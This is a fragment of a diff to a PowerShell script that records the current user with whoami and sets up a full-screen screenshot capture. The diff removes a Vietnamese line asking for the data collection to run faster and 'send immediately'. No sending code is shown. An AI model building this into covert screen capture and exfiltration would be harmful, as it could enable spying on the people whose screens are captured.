@@ -8,7 +8,7 @@ $name = whoami
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen tôi đang thực hiện lấy dữ liệu như này và rất lâu tôi cần bạn làm nó thực hiện nhanh và ngay tức khắc gửi
+$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen 
 
 $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
 $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
